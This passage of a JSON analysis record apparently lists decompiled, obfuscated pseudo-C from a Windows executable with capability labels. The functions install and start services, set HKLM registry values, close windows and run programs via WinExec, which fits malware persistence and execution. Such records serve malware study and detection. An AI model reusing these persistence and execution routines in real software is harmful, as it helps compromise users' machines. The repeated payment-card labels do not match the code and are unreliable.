        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024d9) overlaps instruction at (ram,0x004024d5)\n// \n// WARNING: Removing unreachable block (ram,0x00402536)\n// WARNING: Removing unreachable block (ram,0x004025e2)\n// WARNING: Removing unreachable block (ram,0x0040259b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004024a0(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    unkbyte10 Var3;\n    unkbyte10 Var4;\n    unkbyte10 Var5;\n    unkbyte10 Var6;\n    unkbyte10 Var7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint32_t in_EAX;\n    uint32_t uVar10;\n    int32_t in_ECX;\n    char cVar12;\n    int32_t *in_EDX;\n    int32_t *piVar11;\n    uint8_t uVar13;\n    uint32_t unaff_EBX;\n    uchar *unaff_ESI;\n    uint16_t unaff_DI;\n    uint8_t *puVar14;\n    ushort in_SS;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    char in_SF;\n    bool bVar15;\n    char in_OF;\n    unkbyte10 in_ST0;\n    unkbyte10 Var16;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    int16_t iStack26;\n    uint16_t uStack24;\n    uint16_t uStack22;\n    int16_t iStack20;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        in_EAX = in_EAX & 0xffffff00 | *0x4bb148d3;\n        out(*unaff_ESI, in_EDX);\n    }\n    *arg_8h = 0xc3;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(in_EAX + 0x8316dbec) = in_ST0;\n        uVar8 = in_EAX - 1;\n        uVar9 = 9 < (uVar8 & 0xf) | in_AF;\n        uVar8 = uVar8 + uVar9 * '\\x06';\n        *in_EDX = *in_EDX + 0x46c6df84;\n        *(in_ECX + 0x23664951) =\n             *(in_ECX + 0x23664951) +\n             (in_EAX - 1 & 0xffffff00 | uVar8 + (0x90 < (uVar8 & 0xf0) | in_CF | uVar9 * (0xf9 < uVar8)) * '`');\n        return;\n    }\n    arg_8h[1] = 0x81;\n    iStack20 = in_ECX;\n    bVar15 = (iStack20 - 1U & unaff_DI | 0x61be) < 0;\n    arg_8h[2] = 0x15;\n    if (bVar15) goto code_r0x00402501;\n    uVar10 = unaff_EBX;\n    Var16 = in_ST0;\n    Var3 = in_ST1;\n    Var4 = in_ST2;\n    Var5 = in_ST3;\n    Var6 = in_ST4;\n    Var7 = in_ST5;\n    if (!bVar15) goto code_r0x00402501;\n    while( true ) {\n        in_ST5 = in_ST6;\n        in_ST4 = Var7;\n        in_ST3 = Var6;\n        in_ST2 = Var5;\n        in_ST1 = Var4;\n        in_ST0 = Var3;\n        *(in_EAX + 0x8316dbec) = Var16;\n        in_AF = 9 < (in_EAX - 1U & 0xf) | in_AF;\n        *in_EDX = *in_EDX + 0x46c6df84;\n        unaff_EBX = uVar10 + in_EDX[0x14];\n        arg_8h[4] = 0x3c;\n        arg_8h[5] = 0x7a;\n        bVar15 = (POPCOUNT(in_EDX & 0x66) & 1U) == 0;\n        arg_8h[6] = 0x44;\n        if ((bVar15) || (!bVar15)) goto code_r0x0040257a;\n        puVar1 = segment(in_SS, *0x10 + -0x10);\n        in_EAX = *puVar1;\n        in_EDX = 0xb7bc9ea5;\n        in_ST6 = in_ST7;\n        if (!bVar15) break;\ncode_r0x00402501:\n        arg_8h[3] = 0x5a;\n        uVar10 = unaff_EBX;\n        Var16 = in_ST0;\n        Var3 = in_ST1;\n        Var4 = in_ST2;\n        Var5 = in_ST3;\n        Var6 = in_ST4;\n        Var7 = in_ST5;\n    }\n    uVar10 = in_EAX;\ncode_r0x0040257a:\n    arg_8h[7] = 199;\n    arg_8h[8] = 0x49;\n    bVar15 = (in_EDX & 0x1200) == 0;\n    arg_8h[9] = 0x95;\n    uStack22 = in_EDX;\n    puVar14 = arg_8h;\n    if ((bVar15) || (puVar14 = (arg_8h >> 8 & 0xffff00) << 8 | arg_8h & 0xffff,  !bVar15)) {\n        puVar14[10] = 0x66;\n    }\n    else {\n        uVar10 = uVar10 & 0xffff0000 | CONCAT11(uVar10 >> 8 | arg_8h[0x66], uVar10);\n    }\n    while( true ) {\n        uStack24 = uVar10 >> 0x10;\n        uVar2 = uStack22;\n        piVar11 = in_EDX & 0xffff0000 | uVar2;\n        puVar14[0xb] = 0x45;\n        bVar15 = (uStack22 & 0x1200) == 0;\n        arg_8h[0xc] = 0x68;\n        arg_8h[0xd] = 0xad;\n        if ((!bVar15) && (bVar15)) {\n            uVar10 = uVar10 & 0xe2f4cc58;\n        }\n        arg_8h[0xe] = 2;\n        iStack26 = uVar10;\n        uVar8 = uVar10 >> 8;\n        uVar13 = unaff_EBX >> 8 ^ 0x16 | uVar8;\n        cVar12 = uVar2 >> 8;\n        arg_8h[0xf] = 0xc;\n        uVar9 = uVar10;\n        if ((uVar13 <= cVar12) || (cVar12 < uVar13)) break;\n        in_AF = 9 < (uVar9 & 0xf) | in_AF;\n        uVar10 = uVar10 & 0xffff0000 | CONCAT11(uVar8 + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f;\n        if (puVar14 != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        in_EDX = piVar11 + 1;\n        uStack22 = uStack24;\n    }\n    arg_8h[0x10] = 0x81;\n    arg_8h[0x11] = 0x58;\n    bVar15 = -1 < (iStack26 + CONCAT31(unaff_EBX >> 8, 0x58) | 0x11a9U);\n    arg_8h[0x12] = 0x5d;\n    if ((bVar15) && (!bVar15)) {\n        puVar14 = arg_8h | &stack0xfffffffc;\n        arg_8h = puVar14 + 1;\n        *puVar14 = uVar9;\n        piVar11 = in_EDX & 0xffff0000 | uVar2 & 0xffffff00;\n    }\n    arg_8h[0x13] = 0x1f;\n    arg_8h[0x14] = 0x19;\n    arg_8h[0x15] = 0x58;\n    *(arg_ch + -0x7ce92414) = in_ST0;\n    uVar8 = arg_ch - 1U;\n    uVar9 = 9 < (uVar8 & 0xf) | in_AF;\n    uVar8 = uVar8 + uVar9 * '\\x06';\n    *piVar11 = *piVar11 + 0x458bdf84;\n    *(arg_ch - 1U & 0xffffff00 | uVar8 + (0x90 < (uVar8 & 0xf0) | uVar9 * (0xf9 < uVar8)) * '`' | 0x5f) = 0x16;\n    return;\n}\n",
        "token_count": 2151
    },
    "00402780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027a8) overlaps instruction at (ram,0x004027a7)\n// \n\nuint __fastcall fcn.00402780(int32_t param_1, ushort param_2, int32_t param_3)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n        uVar1 = in(param_2);\n        *unaff_EDI = uVar1;\n        param_3 = param_1;\n        unaff_EDI = unaff_EDI + 1;\n        if (!in_CF && !in_ZF) {\n            return in_EAX;\n        }\n    }\n    *0x8b0c458a = *0x8b0c458a | param_3 >> 8;\n    *unaff_EDI = *unaff_EDI + param_3;\n    *0x8b0c45dc = *0x8b0c45dc + param_2;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(0x56);\n    if (iVar3 != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar3, 0, 0, unaff_EDI >> 8);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n        if (((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0x420)) &&\n           (iVar4 = (*pcVar2)(),  iVar4 != 0x422)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n            return 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 459
    },
    "00402870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402895) overlaps instruction at (ram,0x00402894)\n// \n// WARNING: Removing unreachable block (ram,0x00402895)\n\nbool fcn.00402870(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    char *pvData;\n    \n    pvData = NULL;\n    iVar2 = fcn.00404f50(&pvData);\n    if (iVar2 == 0) {\n        return false;\n    }\n    bVar5 = pvData == NULL;\n    if (bVar5) {\n        return false;\n    }\n    if ((!bVar5) && (bVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = pvData;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, pvData, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 338
    },
    "004029e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004029e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint unaff_retaddr;\n    int32_t in_stack_0000000c;\n    \n    uVar3 = 0;\n    bVar4 = false;\n    bVar6 = false;\n    bVar5 = arg_ch == 0;\n    if (!bVar5) {\n        do {\n            if ((!bVar4 && !bVar5) && (bVar4 || bVar5)) {\n                if (bVar6) {\n                    *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_retaddr;\n                    return CONCAT44(arg_8h, in_stack_0000000c + 1);\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            uVar2 = iVar1 % 0x1a + 0x61;\n            in_EDX = iVar1 % 0x1a & 0xffffff00U | uVar2;\n            *(uVar3 + arg_8h) = uVar2;\n            uVar3 = uVar3 + 1;\n            bVar4 = uVar3 < arg_ch;\n            bVar6 = SBORROW4(uVar3, arg_ch);\n            bVar5 = uVar3 == arg_ch;\n        } while (bVar4);\n    }\n    return CONCAT44(in_EDX, in_EAX);\n}\n",
        "token_count": 450
    },
    "00402a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402af9) overlaps instruction at (ram,0x00402af7)\n// \n\nuint32_t __cdecl fcn.00402a40(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint8_t in_CL;\n    uint32_t in_EDX;\n    int32_t unaff_EBX;\n    uint16_t *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar3;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        puVar3 = unaff_EDI + 1;\n        uVar1 = in(in_EDX);\n        *unaff_EDI = uVar1;\n        arg_8h = in_EAX;\n        if (&stack0xfffffffc < 1) {\n            do {\n                *(in_EAX + 0x335906f5) = *(in_EAX + 0x335906f5) + in_EAX;\n                *(unaff_ESI + -0x75) = *(unaff_ESI + -0x75) << 6;\n                in_EDX = in_EDX + in_EAX;\n                if (in_EDX >> 0x10 != 0) {\n                    if ((-1 < in_EDX) && (-1 >= in_EDX)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    in_EDX = (in_EDX >> 0x10) + (in_EDX & 0xffff);\n                }\n                unaff_ESI = unaff_ESI + 1;\n                puVar3 = puVar3 + -1;\n                if (puVar3 == NULL) {\n                    return (in_EDX >> 0x10) + in_EDX;\n                }\n                in_EAX = *unaff_ESI;\n            } while( true );\n        }\n    }\n    *(unaff_EBX + 0x16a0845) = *(unaff_EBX + 0x16a0845) ^ in_CL;\n    iVar2 = fcn.004010d0((arg_8h ^ 0xdee0ed6d) + ((arg_8h ^ 0xdee0ed6d) >> 8) * -0x31);\n    return iVar2 != 0;\n}\n",
        "token_count": 540
    },
    "004036f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004036f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403be0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar2 = fcn.00402780(uVar1, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 121
    },
    "00403c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403c40(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403ccd) overlaps instruction at (ram,0x00403ccb)\n// \n// WARNING: Removing unreachable block (ram,0x00403ca7)\n// WARNING: Removing unreachable block (ram,0x00403ce8)\n// WARNING: Removing unreachable block (ram,0x00403cea)\n// WARNING: Removing unreachable block (ram,0x00403ccd)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00403c70(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar pvData;\n    uint var_10fh;\n    uchar *var_ch;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar2 = &var_10fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    var_ch = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (var_ch == NULL) {\n        return false;\n    }\n    *var_ch = 0;\n    iVar1 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar1 != 6) {\n        return iVar1 == 7;\n    }\n    return true;\n}\n",
        "token_count": 411
    },
    "00404380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040444f) overlaps instruction at (ram,0x0040444a)\n// \n\nuint __cdecl fcn.00404380(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint8_t in_AL;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    if (&stack0xfffffffc < 0x108) {\ncode_r0x004043a4:\n        puVar4 = &var_4h;\n    }\n    else {\n        if (&stack0xfffffffc >= 0x108) goto code_r0x004043a4;\n        cVar3 = in_AL - *unaff_EDI;\n        arg_8h = unaff_ESI + -1;\n        puVar4 = func_0x1018a316((in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                                 (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 |\n                                 (in_AF & 1) * 0x10 | ((POPCOUNT(cVar3) & 1U) == 0) * 4 | in_AL < *unaff_EDI |\n                                 (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                 (in_AC & 1) * 0x40000);\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, puVar4);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar7 = false;\n    bVar8 = true;\n    var_108h = 0;\n    puVar4 = &var_107h;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar5 = (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar8) && (bVar8)) {\n        iVar6 = unaff_EBX + 1;\n        if (bVar7 || iVar6 == 0) {\n            *(extraout_ECX + 0xab9) = *(extraout_ECX + 0xab9) + iVar6;\n            goto code_r0x00404431;\n        }\n        uVar2 = 9 < (uVar5 & 0xf) | in_AF;\n        piVar1 = (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + uVar2, uVar5 + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - iVar6;\n        arg_8h = arg_8h + 1;\n    }\n    iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar6 != 0) {\n        return 1;\n    }\ncode_r0x00404431:\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404300, 0);\n    iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar6 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 1063
    },
    "004046a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004046ee) overlaps instruction at (ram,0x004046eb)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040480b)\n// WARNING: Removing unreachable block (ram,0x00404818)\n// WARNING: Restarted to delay deadcode elimination for space: ram\n\nchar * fcn.004046a0(uint param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    char cVar5;\n    uint arg_8h;\n    uint8_t uVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    char extraout_CL;\n    int32_t extraout_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    uchar extraout_DL;\n    int32_t unaff_EBX;\n    uchar *puVar11;\n    uint *puVar12;\n    int32_t iVar13;\n    char **unaff_EDI;\n    char *pcVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    uchar uVar16;\n    ulong uVar17;\n    uint uStack32;\n    int32_t iStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t iStack12;\n    \n    iStack12 = param_2;\n    uStack16 = param_1;\n    uStack20 = 0x4046b2;\n    uVar17 = (*_sym.imp.MSVCRT.dll_fopen)();\n    iVar13 = uVar17;\n    if (iVar13 == 0) {\n        return NULL;\n    }\n    if ((iVar13 < 1) || (0 < iVar13)) {\n        uStack16 = param_4;\n        iStack12 = iVar13;\n        uVar17 = CONCAT44(param_4, param_3);\n    }\n    uVar6 = uVar17;\n    uStack24 = uVar17 & 0xffffff00 | uVar6 + 0x8b;\n    puVar1 = iVar13 + 0x52;\n    uVar10 = uVar17 >> 0x20;\n    uVar3 = *puVar1 + uVar10;\n    bVar15 = CARRY1(*puVar1, uVar10) || CARRY1(uVar3, 0x74 < uVar6);\n    *puVar1 = uVar3 + (0x74 < uVar6);\n    uVar16 = *puVar1 == 0;\n    uStack20 = 1;\n    iStack28 = 0x4046dd;\n    pcVar7 = (*_sym.imp.MSVCRT.dll_fwrite)();\n    if ((bVar15) || (!bVar15)) {\n        uStack32 = 0x4046f5;\n        iStack28 = iVar13;\n        pcVar7 = (*_sym.imp.MSVCRT.dll_fflush)();\n        if ((uVar16) || (!uVar16)) goto code_r0x00404709;\n        puVar11 = unaff_EBX + 1;\n        iVar9 = extraout_ECX;\n        uVar16 = extraout_DL;\n        if (bVar15 || puVar11 == NULL) {\n            for (; *0xfffffde1 = uVar16,  iVar9 != 0; iVar9 = iVar9 + -1) {\n                *unaff_EDI = pcVar7;\n                unaff_EDI = unaff_EDI + 1;\n                uVar16 = *0xfffffde1;\n            }\n            *unaff_EDI = pcVar7;\n            *0xfffffee5 = 0x1;\n            *(unaff_EDI + 2) = pcVar7;\n            iStack28 = 0x104;\n            uStack32 = 0xfffffcdd;\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n            arg_8h = *0xfffffef9;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            fcn.004026e0(0xfffffeed, 0xfffffee9);\n            iVar13 = fcn.004031f0();\n            if (iVar13 == 0) {\n                return NULL;\n            }\n            uVar8 = fcn.004022d0(0xfffffde1, *0xfffffeed, *0xfffffee9);\n            bVar15 = (POPCOUNT(uVar8 & 0xff) & 1U) != 0;\n            if (uVar8 == 0) {\n                return NULL;\n            }\n            if ((bVar15) && (!bVar15)) {\n                *(uVar8 + 0x57) = *(uVar8 + 0x57) + -9;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            fcn.00402870();\n            iVar13 = fcn.00402b20(0x407068);\n            if (iVar13 == -1) {\n                iVar13 = fcn.00402b20(0x40705c);\n                uVar8 = iVar13 + 1;\n                if (uVar8 == 0) goto code_r0x004048e9;\n            }\n            iVar13 = fcn.00402a40(arg_8h);\n            if (iVar13 != 0) {\n                fcn.00404b60();\n                fcn.00402130();\n                return 0x1;\n            }\n            uVar8 = *0x4235e4;\n            if (*0x4235e4 == 0) {\n                return NULL;\n            }\ncode_r0x004048e9:\n            bVar15 = (POPCOUNT(uVar8 & 0xff) & 1U) != 0;\n            if ((bVar15) && (!bVar15)) {\n                puVar12 = &stack0xffffffdc;\n                puVar4 = 0xfffffef1;\n                cVar5 = '\\x1e';\n                do {\n                    puVar4 = puVar4 + -1;\n                    puVar12 = puVar12 + -1;\n                    *puVar12 = *puVar4;\n                    cVar5 = cVar5 + -1;\n                } while ('\\0' < cVar5);\n                pcVar7 = in(0x78);\n                return pcVar7;\n            }\n            pcVar7 = fcn.00404e10(arg_8h, 0xfffffde1);\n            if (pcVar7 == NULL) {\n                *0xfffffee5 = pcVar7;\n            }\n            if ((*0xfffffee5 != NULL) && (pcVar7 = fcn.00403be0(*0xfffffef9),  pcVar7 == NULL)) {\n                *0xfffffee5 = pcVar7;\n            }\n            if (*0xfffffee5 == NULL) {\n                *0xfffffee5 = fcn.004010d0();\n            }\n            pcVar14 = *0xfffffee5;\n            pcVar7 = *0xfffffee5;\n            if (*0xfffffee5 != NULL) {\n                pcVar14 = fcn.00402130();\n                pcVar7 = &stack0xffffffe0;\n            }\n            bVar15 = (POPCOUNT(pcVar7 & 0xff) & 1U) != 0;\n            if ((bVar15) && (!bVar15)) {\n                *(pcVar14 + -0x18) = *(pcVar14 + -0x18) + -3;\n                *pcVar14 = *pcVar14 + pcVar14;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n            (*_sym.imp.KERNEL32.dll_WinExec)();\n            return *0xfffffee5;\n        }\n    }\n    else {\n        pcVar14 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        puVar11 = &stack0x15ff5673;\n        *pcVar14 = *pcVar14 + extraout_CL;\n        *pcVar7 = *pcVar7 + pcVar7;\n        *pcVar14 = *pcVar14 + extraout_CL;\n        *pcVar7 = *pcVar7 + pcVar7;\n    }\n    in_AF = 9 < (pcVar7 & 0xf) | in_AF;\n    piVar2 = (pcVar7 & 0xffff0000 | CONCAT11((pcVar7 >> 8) + in_AF, pcVar7 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n    *piVar2 = *piVar2 - puVar11;\n    iVar13 = iVar13 + 1;\ncode_r0x00404709:\n    uStack32 = 0x404710;\n    iStack28 = iVar13;\n    (*_sym.imp.MSVCRT.dll_fclose)();\n    return 0x1;\n}\n",
        "token_count": 1989
    },
    "00404da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dfb) overlaps instruction at (ram,0x00404df7)\n// \n\nuint __cdecl fcn.00404da0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint in_ECX;\n    uint32_t *in_EDX;\n    int32_t *piVar5;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    unkbyte10 extraout_ST0;\n    ulong uVar6;\n    \n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = arg_10h;\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar3 = in_EAX - 1U;\n    uVar2 = 9 < (uVar3 & 0xf) | in_AF;\n    uVar3 = uVar3 + uVar2 * '\\x06';\n    uVar1 = *in_EDX;\n    *in_EDX = *in_EDX + 0x458bdf84;\n    *in_EDX = *in_EDX + (in_ECX >> 8) + (0xba74207b < uVar1);\n    uVar6 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                      (arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, \n                       in_EAX - 1U & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | in_CF | uVar2 * (0xf9 < uVar3)) * '`'\n                       , 0, 0, 0, 0);\n    piVar5 = uVar6 >> 0x20;\n    iVar4 = uVar6;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if ((iVar4 < 0) || (iVar4 >= 0)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n    }\n    else {\n        *(iVar4 + -0x7ce92414) = extraout_ST0;\n        *piVar5 = *piVar5 + -0xaf207c;\n    }\n    return 1;\n}\n",
        "token_count": 568
    },
    "00404e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404e10(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.004020b0(hSCManager, arg_8h);\n    uVar1 = fcn.00404da0(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "00404eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint32_t * __cdecl fcn.00404eb0(uint32_t *arg_8h, char *arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    puVar3 = arg_ch + (arg_8h - arg_14h);\n    bVar6 = puVar3 == NULL;\n    if (bVar6) goto code_r0x00404edd;\n    do {\n        if (bVar6) {\n            arg_8h = arg_8h & 0xffffff00 | *0x4bb148d3;\n            out(*arg_ch, puVar3);\n        }\ncode_r0x00404edd:\n        if (arg_14h == 0) {\n            return arg_8h;\n        }\n        while( true ) {\n            if (puVar3 < arg_8h) {\n                return NULL;\n            }\n            if ((puVar3 <= arg_8h) && (puVar3 > arg_8h)) break;\n            if (*arg_8h == *arg_10h) {\n                bVar6 = true;\n                